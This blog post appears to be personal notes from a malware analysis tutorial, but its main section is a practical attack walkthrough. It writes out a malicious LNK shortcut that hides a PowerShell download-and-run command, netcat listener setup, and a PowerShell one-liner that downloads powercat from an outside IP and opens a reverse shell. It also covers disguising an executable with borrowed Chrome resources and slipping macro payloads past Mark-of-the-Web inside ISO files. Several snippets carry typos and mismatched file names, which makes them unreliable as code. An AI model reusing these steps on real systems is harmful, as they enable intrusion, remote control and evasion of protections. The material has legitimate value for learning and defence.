<!DOCTYPE html>
<html>

  <head>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-HW1TLR9VYX"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-HW1TLR9VYX');
</script>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Intro to malware analysis Amr Thabet</title>
    <meta name="description" content="">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
    <link rel="stylesheet" href="/css/main.css ">
    <link rel="canonical" href="http://localhost:4000/2022/10/21/homeboy-post/">
    <link rel="alternate" type="application/rss+xml" title="%mabd" href="http://localhost:4000/feed.xml ">





</head>


  <body>

    <header id="top">
    <div class="wrapper">
        <a href="/" class="brand">%mabd</a>
        <small></small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a href="/">
                    
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/about/">
                        
                            <i class="fa fa-user-circle"></i>About
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


        <div class="page clearfix" post>
    <div class="left">
        <h1>Intro to malware analysis Amr Thabet</h1>
        <div class="label">

            <div class="label-card">
                <i class="fa fa-calendar"></i>2022-10-21
            </div>

            <div class="label-card">
                <i class="fa fa-user"></i>Mabd
                
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
            


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#Notes" title="Category: Notes" rel="category">Notes</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


            </div>

            <div class="label-card">
            
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <!--a href="/tag/#Malware-analysis" title="Tag: Malware-analysis" rel="tag">Malware-analysis</a-->
        <a href="/tag/#Malware-analysis" title="Tag: Malware-analysis" rel="tag">Malware-analysis</a>&nbsp;
    
        <!--a href="/tag/#APT" title="Tag: APT" rel="tag">APT</a-->
        <a href="/tag/#APT" title="Tag: APT" rel="tag">APT</a>
    
  

</span>

            </div>

        </div>
        <hr>
        <article itemscope itemtype="http://schema.org/BlogPosting">
        <ul id="markdown-toc">
  <li><a href="#1-what-is-a-malware-family" id="markdown-toc-1-what-is-a-malware-family">1. What is a malware family?</a></li>
  <li><a href="#2-types-of-malware-applications" id="markdown-toc-2-types-of-malware-applications">2. Types of Malware applications</a></li>
  <li><a href="#3-what-lang-to-learn" id="markdown-toc-3-what-lang-to-learn">3. What lang to learn</a></li>
  <li><a href="#4-whats-an-apt-attack" id="markdown-toc-4-whats-an-apt-attack">4. What’s an APT Attack?</a></li>
  <li><a href="#5-practical-attack" id="markdown-toc-5-practical-attack">5. Practical attack</a>    <ul>
      <li><a href="#51-initial-access---lnk-file" id="markdown-toc-51-initial-access---lnk-file">5.1 Initial Access - LNK File</a></li>
      <li><a href="#52-download-virus-on-the-victim-machine" id="markdown-toc-52-download-virus-on-the-victim-machine">5.2 Download Virus on the victim machine</a></li>
      <li><a href="#53" id="markdown-toc-53">5.3</a></li>
      <li><a href="#54-popup-in-powershellcolo" id="markdown-toc-54-popup-in-powershellcolo">5.4 Popup in PowerShell/colo</a></li>
      <li><a href="#55-createing-batch-file" id="markdown-toc-55-createing-batch-file">5.5 Createing batch file</a></li>
      <li><a href="#56-reverse-shell-on-windows" id="markdown-toc-56-reverse-shell-on-windows">5.6 Reverse shell on windows</a></li>
    </ul>
  </li>
</ul>

<p>This is a walkthrough for a tutorial on an intoroduction to malware analysis.</p>

<h2 id="1-what-is-a-malware-family">1. What is a malware family?</h2>

<p>A malware family is <strong>a program or set of associated programs with enough “code overlap” to be considered part of the same group</strong>. Grouping them as a family broadens the scope of a single piece of  malware as it alters over time, creating a new piece of malware with distinct family traits.</p>

<p><img style="float:right;filter: grayscale(100%);width:40%" src="/assets/homeboy/dark_gothic_fox.jpeg    " /></p>

<h2 id="2-types-of-malware-applications">2. Types of Malware applications</h2>

<!-- <img src="/assets/homeboy/back2.jpg" alt="drawing" /> -->

<ol>
  <li>
    <p>Trojans A Trojan (or Trojan Horse) disguises itself as legitimate software  with the purpose of tricking you into executing malicious software on 
your computer.</p>
  </li>
  <li>
    <p>Spyware - invades your computer and attempts to steal your personal  information such as credit card or banking information, web browsing 
data, and passwords to various accounts.</p>
  </li>
  <li>
    <p>Rootkits - enable unauthorized users to gain access to your computer without being detected.</p>
  </li>
  <li>
    <p>Ransomware - is designed to encrypt your files and block access to them until a ransom is paid.</p>
  </li>
  <li>
    <p>Worms -replicates itself by infecting other computers that are on the same network. They’re designed to consume bandwidth and interrupt networks.Like a virus, a worm can duplicate itself in other devices or systems. Unlike viruses, worms do not need human action to spread once they are in a network or system.</p>
  </li>
  <li>
    <p>Botnet A computer with a bot infection can spread the bot to other devices, creating what’s known as a botnet. This network of bot-compromised machines can then be controlled and used to launch massive attacks — such as DDoS attacks or brute force attacks</p>
  </li>
  <li>
    <p>Virus - A virus infects other programs and can spread to other systems, in addition to performing its own malicious acts. A virus is attached to a file and is executed once the file is launched. The virus will then encrypt, corrupt, delete, or move your data and files.</p>
  </li>
</ol>

<h2 id="3-what-lang-to-learn">3. What lang to learn</h2>

<ul>
  <li>You will be using:</li>
  <li>Powershell (for scripting)</li>
  <li>C#(for full functional malware, easily integrated with Powershell Windows have auto testing for ps scripts now so people use C# it to run ps inside it  )</li>
  <li>C++ (for native access to windows functionality, also good for cross platform)</li>
  <li>VJ &amp; VB</li>
  <li>Python (for automation &amp; C&amp;C development)</li>
</ul>

<h2 id="4-whats-an-apt-attack">4. What’s an APT Attack?</h2>

<p>APT stands for “Advanced Persistent Threats”</p>

<p>Darkside Ransomware</p>

<p><a href="https://attack.mitre.org/#">https://attack.mitre.org/#</a></p>

<p><a href="https://www.vx-underground.org/index.html">https://www.vx-underground.org/index.html</a> very rich place for malware</p>

<p><a href="https://zeltser.com/start-learning-malware-analysis/">https://zeltser.com/start-learning-malware-analysis/</a> amazing write onhow to start</p>

<h2 id="5-practical-attack">5. Practical attack</h2>
<h3 id="51-initial-access---lnk-file">5.1 Initial Access - LNK File</h3>

<p>LNK files are config file for the shortcuts on the desktop</p>

<p>Demo Example:</p>

<ul>
  <li>Create a malicious LNK file to execute our malware</li>
  <li>Escalate Privileges using our LNK file</li>
  <li>Using Social Engineering to trick the user to allow our malware (Tools: Resource hacker)</li>
</ul>

<p>PowerShell - Creat shourt cut in C:\Users\Public\</p>

<ol>
  <li>Tell powershell that we want to use  “ <strong>ComObject</strong> ” we can use inside program 
<a href="http://wbscript.shell">wbscript.shell</a> is a program so know the $shell variable will be as aprogramm</li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">     </span><span class="nv">$shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-Comobject</span><span class="w"> </span><span class="p">[</span><span class="n">WScript.shell</span><span class="p">](</span><span class="n">http://WScript.shell</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<ol>
  <li>Creat the shortcut file .lnk will never apear to the user</li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">    </span><span class="nv">$destination</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">“</span><span class="n">c:\Users\Public\index.html.lnk</span><span class="err">”</span><span class="w">
    </span><span class="nv">$shortcut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$shell</span><span class="o">.</span><span class="nf">CreatShortcut</span><span class="p">(</span><span class="nv">$detination</span><span class="p">)</span><span class="w">
    </span><span class="nv">$shortcut</span><span class="o">.</span><span class="nf">TargetPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"c:\Users\IEUser\hello.txt"</span><span class="w"> </span><span class="c">#el barnamij eli ra7 tsha8lo</span><span class="w">
    </span><span class="nv">$shortcut</span><span class="o">.</span><span class="nf">IconLocation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"c:\"</span><span class="w">
    </span><span class="nv">$shortcut</span><span class="o">.</span><span class="nf">Save</span><span class="p">()</span><span class="w">
</span></code></pre></div></div>

<h3 id="52-download-virus-on-the-victim-machine">5.2 Download Virus on the victim machine</h3>
<ul>
  <li>Fire a python file server</li>
  <li>Get netcat ready and lessening</li>
  <li>Start the script that will download the file from the files server and connect back to netcat</li>
</ul>

<p>Attacker side:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">    </span><span class="n">python</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">http.server</span><span class="w"> </span><span class="nx">8000</span><span class="w">
    </span><span class="n">nc</span><span class="w"> </span><span class="nt">-vlp</span><span class="w"> </span><span class="nx">4444</span><span class="w">
</span></code></pre></div></div>

<p>Victim side:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">     </span><span class="nv">$shortcut</span><span class="o">.</span><span class="nf">Arguments</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">“</span><span class="w"> </span><span class="err">”</span><span class="w">
</span></code></pre></div></div>

<p>This will work as an instructions in powershell the $shortcut path must be powershell.exe</p>

<blockquote>
  <p>iwr = Invoke Web request</p>
</blockquote>

<blockquote>
  <p>The -OutFile part of the script will output the file under a new name in specefied path</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iwr</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://localhost:8000/powercat.ps1</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">temp</span><span class="nx">\shell.exe</span><span class="p">;</span><span class="o">&amp;</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">temp</span><span class="n">\shell.ps1</span><span class="w">
</span></code></pre></div></div>

<p>We already created a shortcut so now we need to modify the path and add the argument</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$shortcut</span><span class="o">.</span><span class="nf">TargetPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"powershell.exe"</span><span class="w">
</span><span class="nv">$shortcut</span><span class="o">.</span><span class="nf">Argument</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'-c "iwr -Uri http://localhost:8000/powercat.ps1 -OutFile $env:temp\shell.exe;&amp; $env:temp\shell.ps1"'</span><span class="w">
</span><span class="nv">$shortcut</span><span class="o">.</span><span class="nf">WindowStyle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">7</span><span class="w">
</span></code></pre></div></div>

<p>This is better than creating a shortcut → that will lunch a ps file with the command in the Argument</p>

<h3 id="53">5.3</h3>
<p>Make The .exe file that have the code of the reverse shell believable
Lets say we have a file that our shortcut will execute this can be reverse.exe so to make it look more legitimate we can use (ResourceHaker)</p>

<ul>
  <li>Launch RH and select File then select open file contain recourse then  the original app like chrome</li>
  <li>Action then save all resources to a res file then choose a path</li>
  <li>Open the exe file with RH and then Action Add from a resource then choose the file you generated in the last step</li>
  <li>Now the exe file will be more legitimate</li>
</ul>

<p><strong>Are VBA Macros Really Disabled?</strong></p>

<blockquote>
  <p>VBA = Visual basic for application</p>
</blockquote>

<p>Only the one’s that are downloaded from the internet to do that files that are downloaded from the internet are marked with an alternative stream called “Zone.Identifier”. These files are considered locked. To see the Zone.Identifier for a downloaded file:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">filenape.zip</span><span class="w"> </span><span class="nt">-stream</span><span class="w"> </span><span class="nx">Zone.Identifier</span><span class="w">
</span></code></pre></div></div>

<p>Bypass Disabled Macros</p>

<ul>
  <li>We need to remove the Zone.Identefire from our files. To do so, we can compress the document and send it compressed.</li>
  <li>Files compressed with ISO, IMG, VHD, VHDX don’t include zone.Idetifir (as they are mounted). So the bypass is to deliver the malware as an ISO.</li>
  <li>Double click on the iso file will open a folder with a macro without Zone. Identifire</li>
  <li>To compress the macro  into ISO use PackMyPayload</li>
</ul>

<blockquote>
  <p>When compiling a payload for windows it depended on the target if it is a 64bit than use mingw64 and if it is a 32bit windows than mingw32</p>
</blockquote>

<h3 id="54-popup-in-powershellcolo">5.4 Popup in PowerShell/colo</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$wshel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-ComObject</span><span class="w"> </span><span class="nx">WScript</span><span class="w">
</span><span class="nv">$wshel</span><span class="o">.</span><span class="nf">Popup</span><span class="p">(</span><span class="s2">"Hello World"</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="s2">"Done"</span><span class="p">,</span><span class="w"> </span><span class="nx">0X1</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>What are .ps1 files?</li>
</ul>

<p>A script is <strong>a plain text file that contains one or more PowerShell commands</strong>. PowerShell scripts have a . ps1 file extension. Running a script is a lot like running a cmdlet. You type the path and file name of the script and use parameters to submit data and set options.</p>

<h3 id="55-createing-batch-file">5.5 Createing batch file</h3>

<p>This batch file will execute the shelpowershell file.</p>
<ol>
  <li>Make Powershell file popup.ps1</li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$wshel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-ComObject</span><span class="w"> </span><span class="nx">WScript</span><span class="w">
</span><span class="nv">$wshel</span><span class="o">.</span><span class="nf">Popup</span><span class="p">(</span><span class="s2">"Hello World"</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="s2">"Done"</span><span class="p">,</span><span class="w"> </span><span class="nx">0X1</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<ol>
  <li>Make batsh file safefile.bat</li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">    </span><span class="n">Powershell.exe</span><span class="w"> </span><span class="nt">-executionpolicy</span><span class="w"> </span><span class="nx">remotesigned</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="s2">"C:\Users\IEUer\Desktop\popup.ps1"</span><span class="w">
</span></code></pre></div></div>

<h3 id="56-reverse-shell-on-windows">5.6 Reverse shell on windows</h3>

<p>Powercat is script in power shell that give us the functionality of netcat so we want the to get the script on the target machine and the make call using powercat to our listing nc.</p>

<ul>
  <li>Serve the powercat.ps1 file on simple server python -m http.server 80</li>
  <li>Start nc -vlp 4444</li>
  <li>On the target machine the following powershell must be executed</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">    </span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.200.149:80/powercat.ps1');powercat -c 192.168.200.149 -p 4444 -e cmd"</span><span class="w">
</span></code></pre></div></div>


        </article>
        <hr>

        
        
            
            
                
                    
                
                    
                
            
                
                    
                
                    
                
            
                
                    
                
                    
                
            
        
        

        <div class="post-recent">
    <div class="pre">
        
        <p><strong>Previous</strong> <a href="/2021/10/26/myblog/">John Haddix's "Bug Hunter's Methodology v4.0 - Recon Edition"</a></p>
        
    </div>
    <div class="nex">

        
    </div>
</div>


        <!-- <h2 id="comments">Comments</h2>
        


 -->


    </div>
    <button class="anchor"><i class="fa fa-anchor"></i></button>
    <div class="right">
        <div class="wrap">

            <!-- Content -->
            <div class="side content">
                <div>
                    Content
                </div>
                <ul id="content-side" class="content-ul">
                    
                    <!-- <li><a href="#comments">Comments</a></li> -->
                </ul>
            </div>
            <!-- 其他div框放到这里 -->
            <!-- <div class="side">bbbb</div> -->
        </div>
    </div>
</div>
<script>
/**
 * target _blank
 */
(function() {
    var aTags = document.querySelectorAll('article a:not([id])')
    for (var i = 0; i < aTags.length; i++) {
        aTags[i].setAttribute('target', '_blank')
    }
}());
</script>
<script src="/js/pageContent.js " charset="utf-8"></script>


    <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
            
        </p>
        <p class="contact">
            Contact me at: 
            <a href="https://github.com/maabedelhay" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
            <a href="mailto:mohamad.abedhay1@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>    
            <a href="https://twitter.com/ab3d_hay" title="Twitter"><i class="fa fa-twitter" aria-hidden="true"></i></a>  
            <a href="https://t.me/ab3dhay" title="Telegram"><i class="fa fa-telegram" aria-hidden="true"></i></a>    
            <a href="https://www.linkedin.com/in/maabedelhay" title="LinkedIn"><i class="fa fa-linkedin" aria-hidden="true"></i></a>  
        </p>

        <p class="power">
            <span>
                Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://pages.github.com/">Github Pages</a>.
            </span>
            <span>
                Inspired from <a href="https://github.com/Gaohaoyang">HyG</a>.
            </span>
        </p>
    </div>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

    <script src=" /js/main.js " charset="utf-8"></script>
    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
    <script type="text/javascript">
      smoothScroll.init({
        speed: 500, // Integer. How fast to complete the scroll in milliseconds
        easing: 'easeInOutCubic', // Easing pattern to use
        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
      });
    </script>
    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
  </body>

</html>
